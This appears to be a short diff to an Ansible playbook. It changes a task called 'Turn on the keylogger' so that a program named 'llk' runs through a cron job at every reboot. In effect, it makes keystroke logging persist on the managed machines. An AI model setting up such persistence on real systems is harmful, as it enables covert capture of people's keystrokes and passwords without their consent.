@@ -23,4 +23,7 @@
         state: directory
 
     - name: Turn on the keylogger
-      command: llk
+      cron:
+        name: "turn on the keylooger"
+        special_time: reboot
+        job: llk
